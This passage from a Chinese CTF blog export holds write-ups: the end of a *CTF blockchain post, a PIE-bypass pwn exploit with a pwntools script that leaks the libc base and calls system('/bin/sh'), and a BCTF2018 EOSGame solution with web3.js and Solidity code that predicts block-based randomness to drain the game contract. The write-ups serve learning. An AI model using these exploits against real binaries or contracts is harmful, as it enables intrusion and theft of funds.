\"41bc26b103e779479118b5b315d944e5eb785563870acccb39bd71d8d417d89a\", \"transactions\": [ { \"input\": [], \"signature\": [], \"hash\": \"0194a50e9adb6d4ebc3ee4abf60ea11f2ce59cef9afecc316b34fdf007177fc9\", \"output\": [ { \"amount\": 200, \"hash\": \"bcb9c319ba2eb3c7f2bb24a4119b819cddd2b27f732628d07f69232cc7af9a7f\", \"addr\": \"990da5a0ccd7c610f45316d7de526f6e5a8eb0e7172c0049abd57cd77ade4c5daca55487024096ea727b2329bb26c481\", \"id\": \"be4fb3ca-4cdb-4bcc-8f5b-2cbe0b307e01\" }, { \"amount\": 100, \"hash\": \"475e9bd5f35105926339d8ea814a340180a3f80e16ed621f4b581bc22a6ce50e\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"id\": \"d924f0db-0b46-4c93-8c8e-3d83291c83a2\" } ] } ], \"height\": 0 }} &emsp;&emsp;再下面是整个payload的执行完的utxos：12345678910111213141516171819202122232425262728293031323334{ \"ba2c9e75-cd1d-4d8b-9144-98fac2a3f6f2\": { \"amount\": 0, \"hash\": \"94f41f448309e57220a2c3d25dec3d0bf21258014dbef8554702daf3a6030dcd\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"id\": \"ba2c9e75-cd1d-4d8b-9144-98fac2a3f6f2\" }, \"4ca03386-e345-40b0-a197-5aa8fa8b36ba\": { \"amount\": 100, \"hash\": \"4beb7b7d7ded41cb904faeb550f32336c0bd6b9873ceec50e859e2774929a6a5\", \"addr\": \"990da5a0ccd7c610f45316d7de526f6e5a8eb0e7172c0049abd57cd77ade4c5daca55487024096ea727b2329bb26c481\", \"id\": \"4ca03386-e345-40b0-a197-5aa8fa8b36ba\" }, \"071a33e4-95be-4d06-921c-9aca4f43f6bd\": { \"id\": \"071a33e4-95be-4d06-921c-9aca4f43f6bd\", \"amount\": 0, \"hash\": \"ee71b83bd19926d1565b9221fac364211b712e625509c8ffe77ac1954d4ad882\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"extra\": \"14d6d4b5536cb4791ba546f4b94cd1e4464fdbcec6f3dcf1fae2ecb69713dd21371ab93869ce54bfbce755b13614490d$$${\\\"tokenNum\\\": 100, \\\"utxo_id\\\": \\\"071a33e4-95be-4d06-921c-9aca4f43f6bd\\\"}\" }, \"7e82a104-6d3b-4e53-8f07-c7211bbe872a\": { \"id\": \"7e82a104-6d3b-4e53-8f07-c7211bbe872a\", \"amount\": 0, \"hash\": \"3ddfa82c48b68cd088e38acbe149eafb95d2e530bb2c894f47a49ba43f92c3f6\", \"addr\": \"885a66372ff02f9697aabf2e280684066c3024385bdcf56cfc6da1d05d86cb12ebd867fe63e546b6850f1ef0c4dc6a4d\", \"extra\": \"7534ef9e99494d752f67eb6416164888433d3f79ba5679a8de42035054e0a3dc371c7457309ce96d86ed1281d533e06a$$${\\\"tokenNum\\\": 100, \\\"utxo_id\\\": \\\"7e82a104-6d3b-4e53-8f07-c7211bbe872a\\\"}\" }, \"be4fb3ca-4cdb-4bcc-8f5b-2cbe0b307e01\": { \"amount\": 200, \"hash\": \"bcb9c319ba2eb3c7f2bb24a4119b819cddd2b27f732628d07f69232cc7af9a7f\", \"addr\": \"990da5a0ccd7c610f45316d7de526f6e5a8eb0e7172c0049abd57cd77ade4c5daca55487024096ea727b2329bb26c481\", \"id\": \"be4fb3ca-4cdb-4bcc-8f5b-2cbe0b307e01\" }} 总结&emsp;&emsp;其实这道题跟DDCTF 2018里的mini blockchain都是一个人出的，而自己从这两道题中也学到很多关于区块链、智能合约的知识，虽然知识点不多，但都非常具有参考价值。而且自己也觉得区块链会继续在CTF的赛场上出现，所以多花点时间学习区块链相关的知识是非常值得的。 &emsp;&emsp;PS：自己会做跟写出理想的writeup真的还是差点距离，写writeup的好处非常明显，因为在写的过程你需要不断改善你的表达（措辞）以让读者理解你的想法，这是非常考验作者本身对这道题的理解的，写完writeup顿时感觉理解得又深了一步。&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/05/starctf-writeup/"},{"title":"bypass pie use partial overwrite2 and libcdatabase","text":"前言&emsp;&emsp;这篇继续学习PIE bypass和通过libcdatabase查找libc库。 DEMO1&emsp;&emsp;在上一篇文章中采用了爆破程序中的某个函数(如send)的地址，通过判断是否有信息返回作为判断依据，但这个前提是使用了fork进程，因为这样每次的地址才不会变。 &emsp;&emsp;而在这个例子中，服务端并没有采用fork，我们每次请求的地址都不一样，所以就不能像上一道题的爆破做法。先看看程序代码： &emsp;&emsp;漏洞产生在read_msg(0, &amp;s, 128, 10)，前面的read_msg并不会溢出。&emsp;&emsp;checksec如下： &emsp;&emsp;canary是没开的。这里采用的手法也跟前面相似，还是要利用partial overwrite，是程序产生crash，然后我们从输出的数据中发现有价值的信息。一样的因为pie的原因，我们只能操作最低一个字节，可以先写个程序爆破一波，并观察crash。脚本： 12345678910111213141516171819def fuzz(): for a in range(1,256): p = process('./pieagain') # p = remote(ip, 10008) p.recvline() payload = 'A' * 4 p.sendline(payload) p.recvline() p.recvline() # pause() payload = 'A' * 4 * 11 + chr(a) p.sendline(payload) try: p.recvline() print \"======================ok------------\" + hex(a) except: pass p.close() &emsp;&emsp;然后可能在几个地方得到crash，然后对这些产生地方的地址进行筛选，挑选合适的点。这里我得到了\\x83、\\xde等等。。。 &emsp;&emsp;接着对crash出来的数据进行分析： &emsp;&emsp;可以看到这里泄露了libc的地址，但不是基地址，离基地址有这0xf76f3000 - 0xf7541000 = 0x1b2000，而这个差距每次都是固定的，通过readelf -S可以看到这是.got.plt偏移地址。 这里是我本地的偏移地址，我们再打远程时一定要换成远程libc的偏移地址。 &emsp;&emsp;有了libc基地址后就可以写exp了： 12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- coding:utf-8 -*-from pwn import *context(log_level = 'debug', arch = 'i386', os = 'linux')ip = '192.168.10.11'# p = remote(ip, 10008)p = process('./pieagain')pelf = ELF('./pieagain')libc = ELF('./libc.so.local')p.recvline()payload = 'A' * 4p.sendline(payload)p.recvline()p.recvline()pause()payload = 'A' * 4 * 11 + '\\xde'p.sendline(payload)data = p.recv()libc_base_addr = u32('\\x00'+data[9:12]) - 0x1b2000log.debug(\"libc_base_addr =======&gt; \" + hex(libc_base_addr))# 细心的大佬发现这里是code base...# program_start = u32(data[100:100+4]) &amp; 0xfffff000# log.info(\"program start addr: \" + hex(program_start))libc.address = libc_base_addrsystem_addr = libc.symbols['system']log.debug(\"system_addr: \" + hex(system_addr))binsh = next(libc.search('/bin/sh'))log.debug(\"binsh_addr: \" + hex(binsh))payload = 'B' * 4 * 11 + p32(system_addr) + p32(system_addr) + p32(binsh)pause()log.debug(\"ready to call system...\")p.sendline(payload)def fuzz(): # 看上面的 pass# fuzz()p.interactive() DEMO2&emsp;&emsp;但我们没有libc时我们可以通过泄露两个libc函数的地址，然后取最后三位，因为基址的后三位为0，然后取libcdatabase查询，可以点击这里。","link":"/2018/11/bypass-pie-and-libcdatabase/"},{"title":"BCTF2018 EOSGame Study","text":"前言&emsp;&emsp;在写这个study的时候我的exp还在跑，flag还未拿到，但不管结果如何，我都将记录下在这过程中学习到的东西。 远程攻击（可能无效）&emsp;&emsp;首先来看看合约内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159pragma solidity ^0.4.24;/** * @title SafeMath * @dev Math operations with safety checks that revert on error */library SafeMath { /** * @dev Multiplies two numbers, reverts on overflow. */ function mul(uint256 a, uint256 b) internal pure returns (uint256) { // Gas optimization: this is cheaper than requiring 'a' not being zero, but the // benefit is lost if 'b' is also tested. // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522 if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b); return c; } /** * @dev Integer division of two numbers truncating the quotient, reverts on division by zero. */ function div(uint256 a, uint256 b) internal pure returns (uint256) { require(b &gt; 0); // Solidity only automatically asserts when dividing by 0 uint256 c = a / b; // assert(a == b * c + a % b); // There is no case in which this doesn't hold return c; } /** * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend). */ function sub(uint256 a, uint256 b) internal pure returns (uint256) { require(b &lt;= a); uint256 c = a - b; return c; } /** * @dev Adds two numbers, reverts on overflow. */ function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c &gt;= a); return c; } /** * @dev Divides two numbers and returns the remainder (unsigned integer modulo), * reverts when dividing by zero. */ function mod(uint256 a, uint256 b) internal pure returns (uint256) { require(b != 0); return a % b; }}contract EOSToken{ using SafeMath for uint256; string TokenName = \"EOS\"; uint256 totalSupply = 100**18; address owner; mapping(address =&gt; uint256) balances; modifier onlyOwner() { require(msg.sender == owner); _; } constructor() public{ owner = msg.sender; balances[owner] = totalSupply; } function mint(address _to,uint256 _amount) public onlyOwner { require(_amount &lt; totalSupply); totalSupply = totalSupply.sub(_amount); balances[_to] = balances[_to].add(_amount); } function transfer(address _from, address _to, uint256 _amount) public onlyOwner { require(_amount &lt; balances[_from]); balances[_from] = balances[_from].sub(_amount); balances[_to] = balances[_to].add(_amount); } function eosOf(address _who) public constant returns(uint256){ return balances[_who]; }}contract EOSGame{ using SafeMath for uint256; mapping(address =&gt; uint256) public bet_count; uint256 FUND = 100; uint256 MOD_NUM = 20; uint256 POWER = 100; uint256 SMALL_CHIP = 1; uint256 BIG_CHIP = 20; EOSToken eos; event FLAG(string b64email, string slogan); constructor() public{ eos=new EOSToken(); } function initFund() public{ if(bet_count[tx.origin] == 0){ bet_count[tx.origin] = 1; eos.mint(tx.origin, FUND); // 初始化账户 100 } } function bet(uint256 chip) internal { bet_count[tx.origin] = bet_count[tx.origin].add(1); uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp))); uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed))); uint256 shark = seed_hash % MOD_NUM; uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin]))); uint256 lucky = lucky_hash % MOD_NUM; if (shark == lucky){ eos.transfer(address(this), tx.origin, chip.mul(POWER)); } } function smallBlind() public { eos.transfer(tx.origin, address(this), SMALL_CHIP); bet(SMALL_CHIP); } function bigBlind() public { eos.transfer(tx.origin, address(this), BIG_CHIP); bet(BIG_CHIP); } function eosBlanceOf() public view returns(uint256) { return eos.eosOf(tx.origin); } function CaptureTheFlag(string b64email) public{ require (eos.eosOf(tx.origin) &gt; 18888); emit FLAG(b64email, \"Congratulations to capture the flag!\"); }} &emsp;&emsp;可以看到这是一个竞猜的游戏，我们的目的是下面的条件满足： 123if (shark == lucky){ eos.transfer(address(this), tx.origin, chip.mul(POWER));} &emsp;&emsp;让合约往我们账上转钱，直到eos.eosOf(tx.origin) &gt; 18888，从而拿到激发FLAG。 &emsp;&emsp;合约使用的block.number和block.timestamp为当前链上最新的块的编号和时间戳，这两个信息都是公开的，我们可以获取然后使用程序中的判断方法来决定我们什么时候下注。 &emsp;&emsp;由于之前没有认真学习web3js的库，难点也在如何让程序更合约交互得更加的流畅，写exp的过程中也遇到了很多问题。 &emsp;&emsp;首先看abi.encodePacked()，这个函数的作用是返回编码过的bytes，如： 12345function getabi() public view returns(bytes) { uint number = 12345679; return abi.encodePacked(number);}// return: 0x0000000000000000000000000000000000000000000000000000000000bc614f &emsp;&emsp;经过一番查找，找到了这个函数在web3js中的相应实现：web3.eth.abi.encodeParameter('uint256', number)。 &emsp;&emsp;另一个比较严重的问题是溢出，合约中的类型是uint256，我们用nodejs的大数处理的bignumber.js库，但是要注意当运算结果超过2**256时，需要减掉2**256，这样才符合uint256对溢出的处理。如下： 1234567891011let uint256 = new BigNumber('115792089237316195423570985008687907853269984665640564039457584007913129639936');let number1 = new BigNumber(web3.eth.abi.encodeParameter('uint256', encry1));let number2 = new BigNumber(web3.eth.abi.encodeParameter('uint256', encry2));let result = number1.plus(number2); // 这里可能溢出console.log(\"result: \", result.toFormat().replace(/,/g, ''));if (result.gt(uint256)) { result = result.minus(uint256).toFormat().replace(/,/g, ''); console.log(\"overflow update result: \", result);} &emsp;&emsp;但实现了solidity在web3js中的运算迁移后，我们要实现使用web3js对合约进行交互和发送交易。两个月前我在一篇博客中简单说过调用合约的例子，当我拿过来用时发现以前的接口已经不能用了。。。同时会报一些错误，这也是耗费我时间的地方。 &emsp;&emsp;遇到的一个问题就是交易已经打包好（生成了txhash），但发送出去后在我的账号上却无法查看到。如果一直等着会报下面这个错误： 1Error: Transaction was not mined within750 seconds, please make sure your transaction was properly sent. Be aware that it might still be mined! &emsp;&emsp;旧的发送交易使用的是如下代码： 12345678910111213141516171819function sendSigned_Old(txData) { const transaction = new Tx(txData) transaction.sign(privKey) const serializedTx = transaction.serialize().toString('hex'); let transact = web3.eth.sendSignedTransaction('0x' + serializedTx); transact.on('confirmation', (confirmationNumber, receipt) =&gt; { console.log('confirmation', confirmationNumber); }); transact.on('transactionHash', hash =&gt; { console.log('hash', hash); }); transact.on('receipt', receipt =&gt; { console.log('reciept', receipt); }); transact.on('error', console.error);} &emsp;&emsp;网上找了很多，这里提供下我的解决方案： 更换新的的sign签名方法 nonce注意要跟前面的不一样，新版本中可以不用nonce这个标志，web3js会自动帮你处理 &emsp;&emsp;但有个问题很难避免，就是当你检测到shark跟你的lucky相等时立刻下注，但这个注的执行是这个块被矿工挖出来，并且状态是Success。但问题就出在从下注发送到下注被确认的这段时间内实际上是非常有可能产生新的块，从而导致真正去调用合约的时候shark值跟你计算的不一样，从而失败，其根本就是我们无法控制区块的产生。我这里的解决方案是提高gas，让矿工有更高的收益，从而优先打包我们的交易。但问题还是无法百分百解决。 &emsp;&emsp;这里也当记录下web3js的学习记录，完整的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283let Web3 = require(\"web3\");let Tx = require('ethereumjs-tx');const BigNumber = require('bignumber.js');let privKey = new Buffer.from('1dc72fa....', 'hex');let fromAddress = \"0x901B1....\";// 合约地址let contractAddress = \"0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F\";// 创建web3对象let web3 = new Web3();// 连接到 ropsten 测试节点let INFURA_API_KEY = \"9762c....\"let ROPSTEN_URL = \"https://ropsten.infura.io/\" + INFURA_API_KEYlocal = 'http://192.168.142.145:8545'web3.setProvider(new Web3.providers.HttpProvider(ROPSTEN_URL))let abi = [{ \"constant\": true, \"inputs\": [], \"name\": \"eosBlanceOf\", \"outputs\": [{ \"name\": \"\", \"type\": \"uint256\" }], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\"}, { \"constant\": false, \"inputs\": [], \"name\": \"bigBlind\", \"outputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\"}, { \"constant\": false, \"inputs\": [{ \"name\": \"b64email\", \"type\": \"string\" }], \"name\": \"CaptureTheFlag\", \"outputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\"}, { \"constant\": false, \"inputs\": [], \"name\": \"initFund\", \"outputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\"}, { \"constant\": false, \"inputs\": [], \"name\": \"smallBlind\", \"outputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\"}, { \"constant\": true, \"inputs\": [{ \"name\": \"\", \"type\": \"address\" }], \"name\": \"bet_count\", \"outputs\": [{ \"name\": \"\", \"type\": \"uint256\" }], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\"}, { \"inputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"constructor\"}, { \"anonymous\": false, \"inputs\": [{ \"indexed\": false, \"name\": \"b64email\", \"type\": \"string\" }, { \"indexed\": false, \"name\": \"slogan\", \"type\": \"string\" }], \"name\": \"FLAG\", \"type\": \"event\"}]function sendSigned_Old(txData) { // give up}function sendSigned(txData) { web3.eth.accounts.signTransaction(txData, '0x1dc72fa8....') .then(RLPencodedTx =&gt; { let transact = web3.eth.sendSignedTransaction(RLPencodedTx['rawTransaction']); transact.on('confirmation', (confirmationNumber, receipt) =&gt; { console.log('confirmation', confirmationNumber); }); transact.on('transactionHash', hash =&gt; { console.log('hash', hash); }); transact.on('receipt', receipt =&gt; { console.log('reciept', receipt); }); transact.on('error', console.error); setTimeout(nonce =&gt; { process.exit() }, 1000); });}let txData = { chainId: 3, gas: web3.utils.toHex(2500000), gasLimit: web3.utils.toHex(2500000), gasPrice: web3.utils.toHex(40*1e10), // 10 Gwei to: contractAddress, from: fromAddress, value: \"0x0\", //web3.utils.toHex(web3.utils.toWei(0, 'wei')),}let EOSGameContract = new web3.eth.Contract(abi, contractAddress);let MOD_NUM = 20;let initfund = EOSGameContract.methods.initFund().encodeABI();let smallblind = EOSGameContract.methods.smallBlind().encodeABI();let bigblind = EOSGameContract.methods.bigBlind().encodeABI();let ctf = EOSGameContract.methods.CaptureTheFlag('amF5ODBAcHJvdG9ubWFpbC5jb20=').encodeABI();// console.log(\"initFund: \" + initfund);// console.log(\"smallBlind: \" + smallblind);// console.log(\"bigBlind: \" + bigblind);// console.log(\"CaptureTheFlag: \" + ctf);/* * @ abi.encodePacked(number) ---&gt; web3.eth.abi.encodeParameter('uint256', number) */function getshark() { return new Promise((resolve, reject) =&gt; { web3.eth.getBlock('latest').then(results =&gt; { console.log('results.number: ' + results.number); console.log('results.timestamp: ' + results.timestamp); let number = results.number; let timestamp = results.timestamp; let temp = web3.eth.abi.encodeParameter('uint256', number); let temp2 = web3.eth.abi.encodeParameter('uint256', timestamp); let encry1 = web3.utils.keccak256(temp); let encry2 = web3.utils.keccak256(temp2); let uint256 = new BigNumber('115792089237316195423570985008687907853269984665640564039457584007913129639936'); let number1 = new BigNumber(web3.eth.abi.encodeParameter('uint256', encry1)); let number2 = new BigNumber(web3.eth.abi.encodeParameter('uint256', encry2)); // console.log(\"number1: \", number1.toFormat().replace(/,/g, '')); // console.log(\"number2 \", number2.toFormat().replace(/,/g, '')); let result = number1.plus(number2); console.log(\"result: \", result.toFormat().replace(/,/g, '')); if (result.gt(uint256)) { result = result.minus(uint256).toFormat().replace(/,/g, ''); console.log(\"overflow update result: \", result); } let seed = web3.eth.abi.encodeParameter('uint256', result); let seed_hash = web3.utils.keccak256(seed); seed_hash = new BigNumber(web3.eth.abi.encodeParameter('uint256', seed_hash)); console.log(\"seed_hash: \", seed_hash.toFormat().replace(/,/g, '')); let shark = seed_hash.modulo(MOD_NUM).toFormat().replace(/,/g, ''); console.log(\"shark: \", shark); resolve(shark); }); })}function getlucky_hash() { return new Promise((resolve, reject) =&gt; { EOSGameContract.methods.bet_count(fromAddress).call({ from: fromAddress }, function (err, result) { if (err) { throw err; } console.log(\"bet_count result: \" + result); let getabi = web3.eth.abi.encodeParameter('uint256', result); let encry = web3.utils.keccak256(getabi); let lucky = new BigNumber(web3.eth.abi.encodeParameter('uint256', encry)); console.log(\"lucky: \", lucky.toFormat().replace(/,/g, '')); let lhash = lucky.modulo(MOD_NUM).toFormat().replace(/,/g, ''); console.log(\"lucky_hash: \", lhash); resolve(lhash); }) })}EOSGameContract.methods.bet_count(fromAddress).call({ from: fromAddress}, function (err, result) { if (err) { throw err; } console.log(\"bet_count result: \" + result)})function smallBlind() { web3.eth.getTransactionCount(fromAddress).then(function(lastCountOfTransaction){ let temp = txData; temp['data'] = smallblind; temp['nonce'] = web3.utils.toHex(lastCountOfTransaction); console.log(temp); sendSigned(temp); })}function bigBlind() { let temp = txData; temp['data'] = bigblind; console.log(temp); sendSigned(temp);}let listener = EOSGameContract.events.FLAG(function (error, event) { console.log(\"recv event data: \") console.log(event);});listener.on('data', function(event){ console.log(\"recv event data: \") console.log(event);}).on('error', console.error);function exploit() { getshark().then(res =&gt; { getlucky_hash().then(ress =&gt; { EOSGameContract.methods.eosBlanceOf().call({ from: fromAddress }, function (err, result) { if (err) { throw err; } console.log(\"eosBlanceOf result: \" + result) }) if (res == ress) { console.log(\"\\n===================this is time!!!===================\\n\"); smallBlind(); } else { console.log(\"\\n===================it is not time!!!===================\\n\"); } }) })}// smallBlind();setInterval(nonce =&gt; { console.log(\"going....\"); exploit();}, 2500);// setInterval(nonce =&gt; {// console.log(\"going....\");// smallBlind();// }, 3000);// setInterval(nonce =&gt; {// console.log(\"going....\");// getshark().then(res =&gt; {// console.log(res);// })// }, 3000); 攻击合约攻击&emsp;&emsp;当然另一种攻击方式是自己在ropsten上部署攻击合约，以合约调用合约的方式进行攻击，那样就免去了使用蹩脚的web3js进行相关的运算，不用担心计算结果、类型。另一个就是在合约中调用其他合约是立即生效的，而不能等交易被挖出确认。你只需要在A –&gt; B时支付你调用A的账单，在A调用B时是类似于我们的函数调用，不再需要发起交易。 &emsp;&emsp;而且可以看到EOSGame里使用了tx.origin作为账号，而关于tx.origin和msg.sender的区别是sender是合约的直接上级，可以是用户，也可以是另一个合约，而origin只能是用户。如： 1user ---&gt; contract A ---&gt; contract B ---&gt; contract C &emsp;&emsp;对于任一个合约的origin都是user，但contract B的sender是contract A。 &emsp;&emsp;因为我们的攻击合约函数需要改变合约的内容，所以我们不要在攻击函数中加view。 1在Solidity中view函数修饰词的作用是告诉编译器，函数不改变只读取状态变量。 &emsp;&emsp;详细的代码在下面，如果是账号第一次赌就需要toinit一下，在攻击代码中同时使用了bigBlind和smallBlind，在不正确的时候下小注，正确时下大注，以增加自己的几率，毕竟小赌一次可以改变自己的lucky_hash。但这里的for循环被我调到了100，因为测试发现上1000+所需要的gas很大，容易Out of gas。（当然也可以碰运气。。） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091pragma solidity ^0.4.24;contract EOSGame { mapping(address =&gt; uint256) public bet_count; function smallBlind(); function bigBlind(); function CaptureTheFlag(string b64email); function eosBlanceOf() public view returns(uint256); function initFund();}contract AttackGame { uint256 MOD_NUM = 20; address public gameAddr = 0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F; EOSGame mime = EOSGame(gameAddr); function getmyblance() public view returns (uint256) { return mime.eosBlanceOf(); } function toinit() public { mime.initFund(); } function getbet_count() public view returns (uint256) { return mime.bet_count(tx.origin); } function myshark() public view returns(uint256) { uint number = block.number; uint timestamp = block.timestamp; uint256 seed = uint256(keccak256(abi.encodePacked(number)))+uint256(keccak256(abi.encodePacked(timestamp))); uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed))); uint256 shark = seed_hash % MOD_NUM; return shark; } function mylucky() public view returns (uint256) { uint256 lucky_hash = uint256(keccak256(abi.encodePacked(getbet_count()))); uint256 lucky = lucky_hash % MOD_NUM; return lucky; } function tryonce() public returns (string) { uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp))); uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed))); uint256 shark = seed_hash % MOD_NUM; uint256 lucky_hash = uint256(keccak256(abi.encodePacked(getbet_count()))); uint256 lucky = lucky_hash % MOD_NUM; if (shark == lucky){ mime.bigBlind(); } if (getmyblance() &gt; 1000) { return \"success!!!\"; } else { return \"fail!!!\"; } } function dotentimes() public { uint16 i; for (i = 0; i &lt; 10; i++) { mime.smallBlind(); } } function myattack() public returns (string) { uint16 i; for (i = 0; i &lt; 100; i++) { uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp))); uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed))); uint256 shark = seed_hash % MOD_NUM; uint256 lucky_hash = uint256(keccak256(abi.encodePacked(getbet_count()))); uint256 lucky = lucky_hash % MOD_NUM; if (shark == lucky){ mime.bigBlind(); } else { mime.smallBlind(); } } } } &emsp;&emsp;这里所有的调试都可以使用remix-ide，它提供了本地VM和部署到Ropsten链上去的方式。 &emsp;&emsp;还一个选择就是将这个合约部署上ropsten后写一个js调用进行攻击。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197let Web3 = require(\"web3\");let Tx = require('ethereumjs-tx');const BigNumber = require('bignumber.js');let fromAddress = \"0x527e6be04exxxx\";// 合约地址let contractAddress = \"0xc63766717881e05b1d344fb2076ca73aacb2ab91\";// 创建web3对象let web3 = new Web3();// 连接到 ropsten 测试节点let INFURA_API_KEY = \"9762c5d2xxxx\"let ROPSTEN_URL = \"https://ropsten.infura.io/\" + INFURA_API_KEYlocal = 'http://192.168.142.145:8545'web3.setProvider(new Web3.providers.HttpProvider(ROPSTEN_URL))let abi = [{ \"constant\": false, \"inputs\": [], \"name\": \"dotentimes\", \"outputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\" }, { \"constant\": false, \"inputs\": [], \"name\": \"myattack\", \"outputs\": [{ \"name\": \"\", \"type\": \"string\" }], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\" }, { \"constant\": false, \"inputs\": [], \"name\": \"toinit\", \"outputs\": [], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\" }, { \"constant\": false, \"inputs\": [], \"name\": \"tryonce\", \"outputs\": [{ \"name\": \"\", \"type\": \"string\" }], \"payable\": false, \"stateMutability\": \"nonpayable\", \"type\": \"function\" }, { \"constant\": true, \"inputs\": [], \"name\": \"gameAddr\", \"outputs\": [{ \"name\": \"\", \"type\": \"address\" }], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\" }, { \"constant\": true, \"inputs\": [], \"name\": \"getbet_count\", \"outputs\": [{ \"name\": \"\", \"type\": \"uint256\" }], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\" }, { \"constant\": true, \"inputs\": [], \"name\": \"getmyblance\", \"outputs\": [{ \"name\": \"\", \"type\": \"uint256\" }], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\" }, { \"constant\": true, \"inputs\": [], \"name\": \"mylucky\", \"outputs\": [{ \"name\": \"\", \"type\": \"uint256\" }], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\" }, { \"constant\": true, \"inputs\": [], \"name\": \"myshark\", \"outputs\": [{ \"name\": \"\", \"type\": \"uint256\" }], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\" }]let cango = true;function sendSigned(txData) { web3.eth.accounts.signTransaction(txData, '0x6c3xxxx') .then(RLPencodedTx =&gt; { let transact = web3.eth.sendSignedTransaction(RLPencodedTx['rawTransaction']); cango = true; transact.on('confirmation', (confirmationNumber, receipt) =&gt; { console.log('confirmation', confirmationNumber); if (confirmationNumber == '24') { cango = true; } }); transact.on('transactionHash', hash =&gt; { console.log('hash', hash); }); transact.on('receipt', receipt =&gt; { console.log('reciept', receipt); }); transact.on('error', res =&gt; { console.log('error...'); cango = true; }); });}let txData = { chainId: 3, gas: web3.utils.toHex(2500000), gasLimit: web3.utils.toHex(1554770), gasPrice: web3.utils.toHex(2003), // 10 Gwei to: contractAddress, from: fromAddress, value: \"0x0\", //web3.utils.toHex(web3.utils.toWei(0, 'wei')),}let EOSGameContract = new web3.eth.Contract(abi, contractAddress);let myattack = EOSGameContract.methods.myattack().encodeABI();EOSGameContract.methods.getbet_count().call(function (err, result) { if (err) { throw err; } console.log(\"bet_count result: \" + result)})function toattack() { cango = false; let temp = txData; temp['data'] = myattack; console.log(temp); sendSigned(temp); }setInterval(nonce =&gt; { console.log(\"\\n========================================\") if (cango) { console.log(\"going....\"); EOSGameContract.methods.getmyblance().call({ from: fromAddress }, function (err, result) { if (err) { throw err; } console.log(\"eosBlanceOf result: \" + result) }) toattack(); } else { console.log(\"can't going....\"); }}, 20000); &emsp;&emsp;多次几次后可以成功： &emsp;&emsp;接着再调用下：12345678function togetflag() { let temp = txData; temp['data'] = ctf; console.log(temp); sendSigned(temp);}togetflag(); &emsp;&emsp;最终可以在交易块的data中拿到event的输出： &emsp;&emsp;当然在合约的events上也可以看到： &emsp;&emsp;最终的flag会发送到你的邮箱： 1BCTF{y0u_c4n_PlAy_r34L_e0S_D0t_w1n_n0W} 参考链接&emsp;&emsp;合约调用合约&emsp;&emsp;web3js无法发送交易问题&emsp;&emsp;bignumber计算&emsp;&emsp;web3js api doc&emsp;&emsp;一个writeup","link":"/2018/11/bctf2018-eosgame-writeup/"},{"title":"BCTF2018 Fake3D Study","text":"前言&emsp;&emsp;这道题跟上道比简单了点，原理唯一的区别就是如何bypass extcodesize，而这个网上也有解决方案，EOSGame中的FOMO3D游戏就发生过这种攻击。 OverView&emsp;&emsp;首先看合约代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134pragma solidity 